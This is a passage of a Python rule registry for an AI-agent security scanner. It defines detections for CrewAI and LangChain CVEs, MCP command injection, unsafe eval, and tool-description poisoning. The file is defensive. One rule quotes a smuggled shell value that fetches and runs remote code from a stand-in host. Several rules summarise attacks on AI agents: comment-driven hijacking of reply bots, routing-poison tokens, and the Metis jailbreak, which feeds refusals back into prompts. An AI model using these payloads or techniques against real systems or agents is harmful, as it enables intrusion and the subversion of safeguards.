        "or a model passed inside `**params`, is not matched), and the module must "
        "import `stripe`, `shopify`, `medusa` or `commercetools` or have `pricing/` "
        "or `commerce/` in its path; a file under `marketplace/` is out of scope."
    ),
)

_r(
    "AAK-LANGGRAPH-TOOLNODE-LIST-REGRESSION-001",
    "langgraph.prebuilt.ToolNode positional-list misuse",
    "Source code calls `ToolNode([...])` (or `ToolNode(some_list)`) with a "
    "positional list rather than the documented `ToolNode(tools=[...])` "
    "keyword form. langgraph-prebuilt 1.0.11 (2026-04-24) regressed and "
    "silently coerces a positional list into a single-tool node, dropping "
    "every tool past the first and producing message-loop bugs in agents "
    "that depend on tool-routing behaviour.",
    Severity.MEDIUM,
    Category.AGENT_CONFIG,
    "Switch every `ToolNode([t1, t2, ...])` to `ToolNode(tools=[t1, t2, "
    "...])`. The codemod at "
    "`agent_audit_kit/autofix/langgraph_toolnode.py` rewrites the trivial "
    "shape; `aak suggest --apply-trivial --rule "
    "AAK-LANGGRAPH-TOOLNODE-LIST-REGRESSION-001` will run it (queued for "
    "v0.4.0).",
    sarif_name="LangGraphToolNodePositionalList",
    auto_fixable=True,
    limitations=(
        "Fires on `ToolNode(...)` with a list literal or a bare name as its first "
        "positional argument, in a file that imports langgraph.prebuilt as `from "
        "langgraph.prebuilt import ... ToolNode` on one line, `from langgraph "
        "import prebuilt` or `import langgraph.prebuilt`. A parenthesised "
        "multi-line import, `from langgraph.prebuilt.tool_node import ToolNode`, "
        "and an argument that is an attribute or a call (`ToolNode(self.tools)`) "
        "are not matched."
    ),
)

_r(
    "AAK-DEEPSEEK-V4-MOE-TOOL-INJ-001",
    "DeepSeek V4 MoE-routed tool description injection",
    "A function that targets DeepSeek V4 (OpenAI-compatible client with "
    "`base_url=` containing 'deepseek', or `import deepseek`) reads from "
    "an untrusted source (request body, document loader, file read) and "
    "passes the value into a `tools=[{description: ...}]` payload without "
    "calling `sanitize_tool_description`. DeepSeek V4 (Apache 2.0, "
    "2026-04-24) exposes MoE routing via its tool-call envelope — "
    "untrusted text inside a tool description can poison expert "
    "selection (LLM01 with MoE-specific surface). Speculative shape "
    "until corpus refresh.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Pipe untrusted tool descriptions through "
    "`agent_audit_kit.sanitizers.deepseek.sanitize_tool_description` "
    "before assembling the `tools=` payload. The sanitiser strips ANSI / "
    "control characters and routing-poison tokens "
    "([ROUTE: ...], <|route_id|>, __route__=, etc.) and truncates to a "
    "max length. Calling it in the same function suppresses this rule.",
    sarif_name="DeepSeekV4MoeToolInjection",
    owasp_agentic_references=["ASI01", "ASI02"],
    limitations=(
        "Python only, per function. A DeepSeek target is recognised only from a "
        "string literal containing `deepseek` in `base_url=`, or a `deepseek` "
        "import: a URL held in a constant is not seen. An untrusted source is "
        "recognised only from a short list (`request.json`, `request.args`, "
        "`pdfplumber.open`, `unstructured.partition`, `open(...).read()`), so a "
        "page fetched with `requests.get(url).text` is not one, and any `re.sub(` "
        "call in the function counts as sanitising."
    ),
)

_r(
    "AAK-TIKTOK-AGENT-HIJACK-001",
    "Social-agent auto-reply without human-in-loop gate",
    "Source code wires a social-platform reply sink (`tiktok_api.reply`, "
    "`instagrapi.direct.send`, `tweepy.API.update_status`, "
    "`discord.Message.reply`, etc.) to a user-content source "
    "(`comments.fetch`, webhook payload `text` field, media comments) "
    "without an `aak.review.human_in_loop()` / `human_in_the_loop()` / "
    "`require_approval()` gate. Jiacheng Zhong's BlackHat Asia 2026 "
    "(2026-04-24) talk demonstrates hijacks in this class — attacker "
    "posts a crafted comment that the agent's own reply loop turns into "
    "a tool call, reflecting attacker text back to the platform's "
    "audience. OWASP LLM08 (Excessive Agency).",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Place every social-platform write call behind a human-review gate. "
    "AAK ships an `aak.review.human_in_loop(text, comment=...)` helper "
    "that defaults closed and requires explicit approval (CLI, webhook, "
    "or workflow). For high-volume agents, route generated replies to a "
    "moderation queue instead of the platform sink directly.",
    sarif_name="TikTokAgentHijack",
    owasp_agentic_references=["ASI01", "ASI09"],
    incident_references=["BHASIA-2026-TIKTOK-HIJACK"],
    limitations=(
        "Reads .py files only. It fires on one that calls `tiktok_api.reply(`, "
        "`tiktok.comment.reply(`, `instagrapi.direct.send(`, "
        "`instagrapi.<x>.comment_reply(`, `tweepy.API().update_status(`, "
        "`tweepy.Client().create_tweet(`, `discord.Message.reply(` or "
        "`discord.Channel.send(` and also reads `event[\"comment\"]`, "
        "`comments.fetch(`, `webhook.payload[\"text\"]`, `tiktok_api.comments`, "
        "`instagrapi.<x>.comments` or `media.comments`, with none of "
        "`aak.review.human_in_loop(`, `human_in_the_loop(`, `require_approval(` or "
        "`needs_review(`. A reply sent through an instance (`await "
        "message.reply(text)`) is not matched."
    ),
)

_r(
    "AAK-OX-COVERAGE-MANIFEST-001",
    "Project OX-disclosed CVE coverage manifest",
    "Meta / informational rule that surfaces the project's static CVE "
    "coverage map (`agent_audit_kit/data/ox-cve-manifest.json`). Drives "
    "the OX-coverage badge endpoint and the `aak coverage --source ox` "
    "CLI; never fires findings on user code.",
    Severity.INFO,
    Category.SUPPLY_CHAIN,
    "Run `aak coverage --source ox` to see which OX-disclosed CVEs are "
    "covered by AAK rules. The manifest is regenerated on every release "
    "and powers the `OX coverage` badge in README.",
    sarif_name="OxCoverageManifest",
)


# ---------------------------------------------------------------------------
# v0.3.10 (2026-04-29) — CrewAI four-CVE chain (CERT/CC VU#221883),
# LangChain prompt-loader path traversal (CVE-2026-34070), Prisma AIRS
# coverage manifest, OpenClaw privesc (provisional, IronPlate-cited).
# ---------------------------------------------------------------------------

_r(
    "AAK-CREWAI-CHAIN-2026-04-001",
    "CrewAI four-CVE exploit chain reachable in one module",
    "Meta-rule: fires when all four CrewAI 0.x exploit-chain shapes "
    "are reachable in the same module — CVE-2026-2275 "
    "(CodeInterpreterTool unsafe_mode), CVE-2026-2285 (JSON loader "
    "path traversal), CVE-2026-2286 (RAG SSRF) and CVE-2026-2287 "
    "(missing Docker liveness gate). ThaiCERT 2026-04-02 + CERT/CC "
    "VU#221883 demonstrate that an untrusted prompt walks the chain "
    "to host RCE without further exploitation.",
    Severity.CRITICAL,
    Category.AGENT_CONFIG,
    "Apply each child-rule's remediation. The single hardest gate is "
    "CVE-2026-2275 (CodeInterpreterTool unsafe_mode); fixing that one "
    "breaks the chain. The runtime helpers in "
    "`agent_audit_kit.sanitizers.crewai` collectively suppress all "
    "four sub-rules.",
    sarif_name="CrewAiFourCveChain",
    cve_references=[
        "CVE-2026-2275",
        "CVE-2026-2285",
        "CVE-2026-2286",
        "CVE-2026-2287",
    ],
    owasp_agentic_references=["ASI02", "ASI05"],
    incident_references=["CERT-CC-VU-221883"],
    aicm_references=["AIS-07", "STA-08"],
    limitations=(
        "Fires only when all four shapes (an unsafe-mode `CodeInterpreterTool`, a "
        "`JSONSearchTool` or `JSONLoader` path, a `RagTool` or `WebsiteSearchTool` "
        "URL, and a missing Docker check) are found in one file. The same shapes "
        "split across two modules are never reported as the chain, and a comment "
        "that mentions `assert_codeinterp_safe_mode(` removes one shape from the "
        "count."
    ),
)

_r(
    "AAK-CREWAI-CVE-2026-2275-001",
    "CrewAI CodeInterpreterTool with unsafe_mode=True",
    "`CodeInterpreterTool(unsafe_mode=True)` drops into a host Python "
    "interpreter where ctypes / os.system are reachable. CVE-2026-2275 "
    "is the canonical sandbox-escape primitive in the CrewAI 0.x chain "
    "(ThaiCERT 2026-04-02 / CERT/CC VU#221883; CWE-749, CVSS 9.6 "
    "CRITICAL per NVD — the Docker-unreachable fallback to SandboxPython "
    "enables RCE via arbitrary C function calling).",
    Severity.CRITICAL,
    Category.AGENT_CONFIG,
    "Set `unsafe_mode=False` on every CodeInterpreterTool invocation. "
    "If you must run untrusted code, wrap with a real container "
    "sandbox and call "
    "`agent_audit_kit.sanitizers.crewai.assert_codeinterp_safe_mode("
    "False)` in the same function to suppress this rule.",
    sarif_name="CrewAiCodeInterpUnsafeMode",
    cve_references=["CVE-2026-2275"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-01"],
    incident_references=["CERT-CC-VU-221883"],
    limitations=(
        "Fires on a literal `unsafe_mode=True` in a `CodeInterpreterTool(...)` call "
        "in a file that imports crewai. `unsafe_mode` taken from a variable or a "
        "setting is not read, and the guard is looked for as text in the enclosing "
        "function, so a comment that mentions `assert_codeinterp_safe_mode(` "
        "silences it."
    ),
)

_r(
    "AAK-CREWAI-CVE-2026-2285-001",
    "CrewAI JSON loader path traversal",
    "`JSONSearchTool(file_path=...)` / `JSONLoader(path=...)` accepts "
    "an attacker-influenceable path without anchoring to a project "
    "root. CVE-2026-2285 (arbitrary local file read, CVSS 7.5 HIGH per "
    "NVD): untrusted JSON-loader path lets the agent read arbitrary "
    "files (chained with the other three CVEs into host RCE).",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Anchor every JSON-loader path with "
    "`agent_audit_kit.sanitizers.crewai.validate_jsonloader_path("
    "path, root=...)` before passing into the tool. Calling the "
    "validator in the same function suppresses this rule.",
    sarif_name="CrewAiJsonLoaderTraversal",
    cve_references=["CVE-2026-2285"],
    owasp_agentic_references=["ASI02"],
    incident_references=["CERT-CC-VU-221883"],
    limitations=(
        "Needs a non-constant path argument and, in the same function, one of a "
        "short list of source spellings (`request.json`, `request.args`, "
        "`request.form`, `event`, `user_input`, `agent.kickoff(`, ...). "
        "`request.get_json()`, or a path that arrives as a function parameter, is "
        "not a source, so the call is not reported."
    ),
)

_r(
    "AAK-CREWAI-CVE-2026-2286-001",
    "CrewAI RagTool / WebsiteSearchTool SSRF",
    "`RagTool(url=...)` / `WebsiteSearchTool(url=...)` accepts a "
    "non-constant URL reachable from an untrusted source without an "
    "allow-list / private-network guard. CVE-2026-2286 (CWE-918, "
    "CVSS 9.8 CRITICAL per NVD): cloud-metadata or loopback SSRF feeds "
    "back into the agent tool-use loop.",
    Severity.CRITICAL,
    Category.TRANSPORT_SECURITY,
    "Wrap every RAG / website URL with "
    "`agent_audit_kit.sanitizers.crewai.validate_rag_url(url, "
    "allowlist=[...])`. The helper rejects private IPs after DNS "
    "resolution and enforces an explicit hostname allow-list.",
    sarif_name="CrewAiRagSsrf",
    cve_references=["CVE-2026-2286"],
    owasp_agentic_references=["ASI02"],
    incident_references=["CERT-CC-VU-221883"],
    limitations=(
        "Fires on `RagTool` or `WebsiteSearchTool` built with a non-constant `url`, "
        "`website` or `web_url` (or first positional argument) inside a function whose "
        "text contains `request.json`, `request.body`, `request.args`, `request.form`, "
        "`request.data`, `request.values`, `request.files`, `event`, `llm_input`, "
        "`user_input`, `agent.kickoff(`, `task.execute(` or `inputs=`, and no "
        "`validate_rag_url(` call. A URL that arrives as an ordinary function "
        "parameter (`def search(website_url)`) carries no marker and is not reported."
    ),
)

_r(
    "AAK-CREWAI-CVE-2026-2287-001",
    "CrewAI sandbox fallback without Docker liveness check",
    "`CodeInterpreterTool(...)` does not gate execution on a Docker "
    "liveness check (`docker_required=True` is unset and "
    "`require_docker_liveness(client)` is not called). A dead Docker "
    "daemon silently falls back to the host Python interpreter, "
    "completing the chain to host RCE (CVE-2026-2287, CWE-94, "
    "CVSS 9.8 CRITICAL per NVD).",
    Severity.CRITICAL,
    Category.AGENT_CONFIG,
    "Either set `docker_required=True` on CodeInterpreterTool or "
    "call `agent_audit_kit.sanitizers.crewai.require_docker_liveness("
    "client)` in the same function — the helper raises before the "
    "tool ever sees the host fallback.",
    sarif_name="CrewAiDockerLivenessMissing",
    cve_references=["CVE-2026-2287"],
    owasp_agentic_references=["ASI05"],
    incident_references=["CERT-CC-VU-221883"],
    limitations=(
        "Fires on every `CodeInterpreterTool(...)` call that has no literal "
        "`docker_required=True` and no `require_docker_liveness(` in the enclosing "
        "function. That text is matched as source, so a comment that mentions "
        "`require_docker_liveness(` silences it."
    ),
)

_r(
    "AAK-LANGCHAIN-PROMPT-LOADER-PATH-001",
    "LangChain load_prompt path traversal (CVE-2026-34070)",
    "`langchain.prompts.load_prompt(path)` / "
    "`PromptTemplate.from_file(path)` accepts an attacker-influenced "
    "path without anchoring to a project root or allow-listed URI "
    "scheme. CVE-2026-34070 (CVSS 7.5): the lc:// scheme + raw file "
    "paths let a crafted prompt template read arbitrary files. Patched "
    "in `langchain-core>=0.3.74`; pinning a vulnerable version is also "
    "a finding.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Validate every prompt path with "
    "`agent_audit_kit.checks.path_under_root(path, root)` before "
    "calling load_prompt. For S3 / HTTP backed prompt stores, prefer "
    "the explicit `langchain_community.storage.*` adapters; AAK "
    "exempts those via pattern-not-inside. Bump "
    "`langchain-core` to >= 0.3.74.",
    sarif_name="LangChainPromptLoaderTraversal",
    cve_references=["CVE-2026-34070"],
    owasp_agentic_references=["ASI02", "ASI04"],
    incident_references=["LANGCHAIN-PROMPT-LOADER-2026-03"],
    limitations=(
        "Needs a non-constant path passed to `load_prompt` or `from_file` and, in "
        "the same function, a source spelled `request.json`, `request.args`, "
        "`sys.argv`, `os.environ` or the like; a path that arrives as a function "
        "parameter is not a source. Any `os.path.realpath(` in the function counts "
        "as a guard although it normalises the path and does not confine it to a "
        "directory. A file that imports `from langchain_core.prompts.loading import "
        "load_prompt` is skipped."
    ),
)

_r(
    "AAK-PRISMA-AIRS-COVERAGE-001",
    "Prisma AIRS catalog coverage manifest",
    "Meta / informational rule that surfaces AAK's static coverage of "
    "the public Prisma AIRS 3.0 attack catalog. Drives "
    "`aak coverage --source prisma-airs` and the published coverage "
    "matrix. Never fires findings on user code.",
    Severity.INFO,
    Category.SUPPLY_CHAIN,
    "Run `aak coverage --source prisma-airs` to see how AAK's static "
    "ruleset maps onto Palo Alto's published Prisma AIRS attack "
    "catalog. The map is hand-curated; entries flagged "
    "`status: catalog-private` are not publicly disclosed and "
    "intentionally absent from AAK coverage.",
    sarif_name="PrismaAirsCoverageManifest",
)

_r(
    "AAK-ASTROMCP-SQLI-CVE-2026-7591-001",
    "astro-mcp-server SQL injection (CVE-2026-7591, npm <=1.1.1)",
    "TimBroddin/astro-mcp-server <=1.1.1 builds SQL queries from "
    "`request.params.arguments` via string concatenation in "
    "`src/index.ts` (the MCP-tool query-construction path). "
    "CVE-2026-7591 (NVD 2026-05-01, CWE-89): no upstream patch "
    "released as of the AAK ship date — the latest npm publish "
    "(1.1.1) is the same version flagged as the vulnerable ceiling. "
    "Two detector arms: a pin-check on package.json / package-lock "
    "/ yarn.lock / pnpm-lock fires whenever the package is present "
    "(because every published version is vulnerable), and a TS / JS "
    "source detector fires when files importing the package build "
    "queries via string concatenation or untagged template "
    "literals. Tagged-template SQL helpers (`sql\\`...\\``, drizzle, "
    "prisma, postgres-js) escape interpolations safely and are "
    "intentionally not matched.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Pin away from astro-mcp-server until a fixed release is "
    "published (track upstream at "
    "https://github.com/TimBroddin/astro-mcp-server). For the "
    "source shape, switch to a parameterized-query API (e.g., "
    "`db.query(sql, [param])`, `cursor.execute(sql, params)`) or "
    "wrap interpolations in a tagged-template SQL helper such as "
    "`drizzle-orm`, `postgres-js`, or `sql-template-tag` — those "
    "escape values safely and AAK ignores them.",
    sarif_name="AstroMcpSqlInjection",
    cve_references=["CVE-2026-7591"],
    owasp_agentic_references=["ASI02", "ASI04"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    incident_references=["NVD-CVE-2026-7591", "VULDB-360544"],
    limitations=(
        "Two arms. The pin reads `astro-mcp-server` in the root package.json, "
        "yarn.lock and pnpm-lock.yaml, and in package-lock.json only as a listed "
        "dependency (`\"astro-mcp-server\": \"1.1.1\"`), and reports every version "
        "because no fix exists. A `node_modules/astro-mcp-server` entry that only a "
        "transitive dependency adds to package-lock.json, a Yarn 2+ yarn.lock, a "
        "sub-directory package.json and an `npx` launcher in .mcp.json are not "
        "read. The source arm needs the SQL string concatenated or interpolated "
        "inside the call on `db`, `client`, `conn`, `connection`, `pool`, `cursor`, "
        "`database`, `sqlite` or `knex`, so a query built in a variable first "
        "(`const sql = \"SELECT ...\" + id; db.query(sql)`) is not reported."
    ),
)

_r(
    "AAK-SKILL-LIFECYCLE-ATTRIBUTION-001",
    "Skill execute mutates state without outcome-attribution record (SkillsVote arXiv:2605.18401, research-grade)",
    "A Skill execute / run function mutates persistent state (file "
    "write, DB commit, side-effecting HTTP verb) without emitting an "
    "outcome-attribution call (`record_outcome` / `log_outcome` / "
    "`attribute_*` / etc.) in the same function body. Per *SkillsVote: "
    "Lifecycle Governance of Agent Skills* (Liu et al., arXiv:2605.18401, "
    "2026-05-18), the evidence-gated update loop depends on per-execution "
    "attribution; missing attribution silently degrades repeat "
    "invocations. **Research-grade** — MEDIUM reflects non-trivial "
    "false-positive risk (per-project attribution-call naming varies; "
    "the paper does not prescribe a specific schema).",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Emit a structured outcome record at the end of the skill's execute "
    "function: e.g., `record_outcome(skill_id=..., outcome='success'|"
    "'failure', signals={...})`. The schema can be project-local — "
    "SkillsVote does not prescribe a specific format — but the call "
    "must be present in the same function body so the evidence-gated "
    "update loop can consume it.",
    sarif_name="SkillLifecycleAttributionMissing",
    incident_references=["ARXIV-2605.18401"],
    limitations=(
        "Recognises a skill by a decorator (`@skill`, `@skill_fn`, "
        "`@register_skill`, `@skills_vote_skill`) or by a function named `execute`, "
        "`run_skill`, `invoke_skill` or `skill_main` in a folder named exactly "
        "`skill`, `skills`, `agent-skills`, `.skills` or `skill-pack`; "
        "`agent_skills/` is not one. A state change is a call named `write_text`, "
        "`write_bytes`, `save`, `dump`, `persist`, `commit`, `post`, `put`, "
        "`patch`, `delete` and a few others, so `open(path, \"w\")` followed by "
        "`handle.write(text)` is not one."
    ),
)

_r(
    "AAK-AGENT-HARNESS-SHARED-STATE-001",
    "Multi-agent shared state mutated by >=2 agents without a lock primitive (Code-as-Harness, research-grade)",
    "A module-level mutable object (`dict` / `list` / `set` / "
    "comprehension result) is mutated by methods of >=2 distinct "
    "Agent / Worker / Harness classes without a lock primitive "
    "(`threading.Lock` / `asyncio.Lock` / etc.) visible in any of "
    "the mutating function bodies. Per *Code as Agent Harness* "
    "(Ning et al., arXiv:2605.18747, 2026-05-18 — survey of 110+ "
    "papers + 23 systems), 'consistent shared state across multiple "
    "agents' is named as an explicit open challenge. **Research-grade** "
    "— MEDIUM reflects expected false-positive rate when serialization "
    "is enforced by an external coordinator (database transaction, "
    "message queue) the AST scanner can't see.",
    Severity.MEDIUM,
    Category.A2A_PROTOCOL,
    "Guard every mutation against the shared symbol with a lock "
    "primitive (`threading.Lock` / `asyncio.Lock` / "
    "`multiprocessing.Lock`). If serialization is enforced by an "
    "external coordinator (database transaction, message queue), list "
    "the file under `ignore-paths` in `.agent-audit-kit.yml`; AAK reads "
    "no per-line suppression comment.",
    sarif_name="MultiAgentSharedStateNoLock",
    owasp_agentic_references=["ASI06", "ASI08"],
    incident_references=["ARXIV-2605.18747"],
    limitations=(
        "Tracks only module-level `dict`, `list` and `set` objects that methods of "
        "classes whose names end in `Agent`, `Worker` or `Harness` mutate. The same "
        "shared state held as a class attribute (`self.registry[key] = value`), or "
        "mutated by classes named `Researcher` and `Writer`, is not seen. A method "
        "that mentions a name such as `Lock` or `acquire` counts as locking, so "
        "`with threading.Lock():`, which makes a new lock on every call and "
        "excludes nothing, clears it."
    ),
)

_r(
    "AAK-MCP-LINEAGE-STAINLESS-001",
    "Stainless-generator provenance / lineage (informational)",
    "The source tree contains a Stainless auto-generation marker — "
    "either the in-file banner `File generated from our OpenAPI spec "
    "by Stainless.` (verified verbatim against "
    "github.com/anthropics/anthropic-sdk-python on 2026-05-19) or a "
    "`stainless.yml` / `.stainless/` config-as-code shape at the "
    "project root. Stainless is the API-spec-to-SDK / CLI / MCP-"
    "server generator [Anthropic acquired on 2026-05-18]"
    "(https://www.anthropic.com/news/anthropic-acquires-stainless). "
    "This rule is **provenance, not vulnerability** — severity INFO. "
    "It surfaces the generator lineage so procurement teams and "
    "SBOM tooling can answer 'which of our MCP servers / SDKs are "
    "generator-produced vs hand-authored.' The Anthropic announcement "
    "makes **no** mention of winding down the generator or of "
    "pre-vs-post-acquisition default differences; AAK does not "
    "fabricate either claim. If a future CVE class lands against a "
    "specific Stainless generator version, this rule will be "
    "re-targeted to fire only on the affected lineage.",
    Severity.INFO,
    Category.SUPPLY_CHAIN,
    "No action required for the rule fire itself — this is a lineage "
    "data point. For SBOM / supply-chain attestation, record the "
    "Stainless lineage alongside the package's own version metadata. "
    "If you'd prefer to suppress the rule in your project, add the "
    "rule ID to your `aak ignore` config — `INFO` rules are silent "
    "by default in `aak scan` unless `--severity info` is passed.",
    sarif_name="StainlessLineageProvenance",
    incident_references=["ANTHROPIC-STAINLESS-2026-05-18"],
    limitations=(
        "Looks for the banner `File generated from our OpenAPI spec by Stainless` "
        "or `Code generated by Stainless` in the first 8 lines of .py, .ts, .tsx, "
        ".js, .mjs, .cjs, .go, .java, .kt, .rb, .cs and .php files outside .git, "
        "node_modules, dist, build, .venv, venv and __pycache__, and for a "
        "`stainless.yml`-style config file or a `.stainless/` directory at the "
        "project root. A banner below line 8 (under a long licence header), a "
        "generated SDK installed as a dependency under node_modules, and a config "
        "file in a sub-directory are not reported."
    ),
)

_r(
    "AAK-METIS-REFUSAL-REFEED-001",
    "Refusal text re-fed into prompt without policy mediation (Metis, research-grade)",
    "A function consumes an LLM-refusal signal (parameter name or local "
    "variable matches `refusal`/`rejected`/`denied`/`decline`/`handle_refusal`) "
    "and either (a) returns the refusal value or (b) passes it as an "
    "argument to a prompt-sink call (`format` / `append` / `add_message` / "
    "`build_prompt` / etc.) without first re-categorizing it into an "
    "opaque token. Per *Metis: Learning to Jailbreak LLMs via "
    "Self-Evolving Metacognitive Policy Optimization* (arXiv:2605.10067, "
    "ICML 2026), structured refusal feedback used as a semantic gradient "
    "is the exploited surface. **Research-grade — MEDIUM severity reflects "
    "non-trivial false-positive risk; treat as a code-review prompt, not "
    "an automatic block.**",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Wrap the refusal value in a policy-mediated transformation before "
    "re-use: discretize into a fixed enum (e.g., `RefusalKind.POLICY` / "
    "`RefusalKind.SAFETY`), rate-limit retries, strip free-text content. "
    "Never echo a verbatim refusal sentence into the next prompt — that "
    "is the closed-loop reasoning gradient Metis exploits.",
    sarif_name="MetisRefusalRefeed",
    owasp_agentic_references=["ASI01"],
    incident_references=["ARXIV-2605.10067"],
    limitations=(
        "Follows a refusal only through a parameter or variable whose name contains "
        "`refusal`, `rejected`, `denied`, `denial` or `decline` (and plain copies "
        "of it), and reports it only when it is returned or passed as a bare "
        "argument to `append`, `extend`, `format`, `add_message` and the other "
        "listed sink calls. Wrapped in a dict or an f-string "
        "(`messages.append({\"role\": \"user\", \"content\": refusal})`) it is not "
        "reported, and a variable called `refused` is never tracked."
    ),
)

_r(
    "AAK-METIS-SCORING-SINK-001",
    "Scoring / judge value flows into prompt-sink call (Metis, research-grade)",
    "A function consumes a scoring / judge signal (parameter or local "
    "variable matches `score`/`scoring`/`judge`/`reward`/`rating`/"
    "`critique`) and passes it into a prompt-sink call (`format` / "
    "`append` / `add_message` / `build_prompt` / etc.) without "
    "discretizing the signal first. Per Metis (arXiv:2605.10067), "
    "numeric or verbose scoring strings are exactly the semantic "
    "gradient an adversary uses to refine its policy across "
    "closed-loop reasoning iterations. **Research-grade — MEDIUM "
    "severity reflects non-trivial false-positive risk.**",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Discretize scoring signals into an opaque bucket (e.g., PASS / "
    "FAIL / PARTIAL) before re-injecting. If a numeric score must be "
    "exposed, cap it (e.g., 0-3 ordinal) and avoid free-text critiques. "
    "Per Metis: any verbose feedback string is fuel for the metacognitive "
    "policy refinement the paper demonstrates.",
    sarif_name="MetisScoringSink",
    owasp_agentic_references=["ASI01"],
    incident_references=["ARXIV-2605.10067"],
    limitations=(
        "Follows a score only through a parameter or variable whose name contains "
        "`score`, `judge`, `reward`, `rating` or `critique` (and plain copies of "
        "it), and reports it only when it is passed as a bare argument to a call "
        "named `format`, `append`, `extend`, `add_message`, `build_prompt` and the "
        "like. Putting it into an f-string (`f\"Your last draft scored {score}\"`), "
        "or into a dict passed to `append`, is not reported."
    ),
)

_r(
    "AAK-MCP-TOOL-UNSAFE-EVAL-001",
    "Unsafe eval()/exec()/compile() inside @mcp.tool handler (CVE-2026-44717 class)",
    "An MCP tool handler routes a tool-parameter value through "
    "`eval()`, `exec()`, `compile()`, `__import__()`, or SymPy "
    "`parse_expr()` without `local_dict`/`global_dict` pinning. "
    "This is the architectural class behind CVE-2026-44717 "
    "(mcp-calculate-server, v0.3.18 named-pin row "
    "`AAK-MCPCALC-CVE-2026-44717-PIN-001`) and generalizes to any "
    "single-author MCP server with the same shape — independent "
    "of upstream package identity. The Python AST visitor matches "
    "functions decorated with `@mcp.tool` / `@server.tool` / "
    "`@app.tool` / `@fastmcp.tool` / `@tool` whose body contains "
    "an `eval` / `exec` / `compile` / `__import__` / unsafe "
    "`parse_expr` call with an argument bound to the function's "
    "parameter set.",
    Severity.CRITICAL,
    Category.TOOL_POISONING,
    "Replace `eval(expr)` with `ast.literal_eval(expr)` for "
    "trusted-literal inputs, or with SymPy "
    "`parse_expr(expr, local_dict={}, global_dict={}, evaluate=True)` "
    "plus a strict symbol allow-list for math. Validate input "
    "length + char-set before evaluation. The `mcp-calculate-server` "
    "0.1.1 fix is one canonical example of the safer shape.",
    sarif_name="McpToolUnsafeEvalSourceShape",
    cve_references=["CVE-2026-44717"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    incident_references=["NVD-CVE-2026-44717"],
    limitations=(
        "Looks inside the body of the decorated function only, at calls to `eval`, "
        "`exec`, `compile`, `__import__` or `parse_expr` whose argument is a "
        "parameter's bare name. A helper that does the `eval` (`return "
        "_evaluate(expression)`) and a transformed argument "
        "(`eval(expression.strip())`) are not reported."
    ),
)

_r(
    "AAK-MCP-TOOL-ARG-OSCMD-001",
    "Tool handler passes a model-supplied argument into an OS command",
    "An MCP tool handler builds a shell command string out of a value that "
    "arrives in the tool-call arguments object, then hands that string to a "
    "process API — `child_process.exec` / `execSync`, or `spawn` / `execFile` "
    "with `shell: true`. Because the string is composed at the call site "
    "(a template literal with `${...}`, or a concatenation) the argument is "
    "parsed by a shell, so a value such as `mp4; curl attacker.sh | sh` runs "
    "as a second command. This is the shape of CVE-2026-78430 "
    "(`mcp-ffmpeg-helper` 0.1.0 / 0.1.1 / 0.2.1, `handleToolCall` in "
    "`src/tools/handlers.ts`, CWE-77/CWE-78), which carries a CVSS 3.1 base "
    "of only 5.3 because the vector requires a local attacker — but in an "
    "agent pipeline the local caller IS the model, and any upstream prompt "
    "injection reaches this sink with the server's own privileges, which is "
    "why this rule is CRITICAL rather than MEDIUM. The surface is the "
    "handler, not the launcher: `AAK-MCP-002` and the "
    "`AAK-MCP-STDIO-CMD-INJ-*` family inspect the configured server command "
    "before the process starts, whereas this fires on the request path. "
    "Detection is a TypeScript/JavaScript source pattern and is deliberately "
    "narrower than `AAK-TAINT-001`, which reports any `child_process` call in "
    "an MCP file without checking how the command was built; where this rule "
    "fires, that one is suppressed on the same line so one defect is reported "
    "once.",
    Severity.CRITICAL,
    Category.TOOL_POISONING,
    "Pass arguments as an argv array to the process API and never as a "
    "composed shell string: `execFile('ffmpeg', ['-i', input, '-f', format])` "
    "rather than `exec(`ffmpeg -i ${input} -f ${format}`)`, and leave "
    "`shell` unset (it defaults to false). Validate the argument against an "
    "allowlist of expected values before it reaches the process boundary — "
    "for a codec or container format that is a fixed, short list, so an "
    "allowlist is exact rather than a filter that has to anticipate every "
    "metacharacter.",
    sarif_name="McpToolArgOsCommand",
    cve_references=["CVE-2026-78430"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-04"],
    limitations=(
        "Reads `.ts` and `.tsx` files that carry a tool-call marker "
        "(`handleToolCall`, `CallToolRequestSchema`, `setRequestHandler`, "
        "`server.tool`, `tools/call`) and reports `exec` or `execSync` whose first "
        "argument is a template literal with `${}` or a concatenation written "
        "inside the call. A command built into a variable first and then passed as "
        "`exec(command)` is not reported, and neither is the same code in a `.js` "
        "file."
    ),
)

_r(
    "AAK-MCP-OPENAPI-LAZY-DESCRIPTION-001",
    "OpenAPI operation with missing or sub-40-char description (Hermes LAZY)",
    "An OpenAPI 3.x operation has a missing or sub-40-character "
    "`description` field. Per Hermes (arXiv:2605.14312, EASE 2026), "
    "this is the most common smell in MCP-on-REST migrations — "
    "agents over-rely on operation descriptions to disambiguate "
    "tool choice, and sparse descriptions cause silent mis-routing. "
    "Hermes' large-scale evaluation found this smell across "
    "essentially every analyzed operation in the 600-endpoint "
    "corpus, with 2,450 smells total across the 3 classes "
    "(LAZY / BLOATED / TANGLED).",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Author a >=40-character description that names the operation's "
    "purpose, expected input shape, and side-effecting class. "
    "Agent tool-selection accuracy improves materially when "
    "descriptions disambiguate similar-looking operations.",
    sarif_name="OpenApiLazyDescription",
    incident_references=["ARXIV-2605.14312"],
    limitations=(
        "Looks for the spec only at the project root (`openapi.*`, `swagger.*`, "
        "`*.openapi.*`) or under a top-level `api/`, `openapi/`, `spec/` or "
        "`docs/api/` folder; `backend/openapi.yaml` and `docs/openapi.yaml` are not "
        "found. A `summary` of 40 or more characters counts as the description."
    ),
)

_r(
    "AAK-MCP-OPENAPI-BLOATED-PARAMS-001",
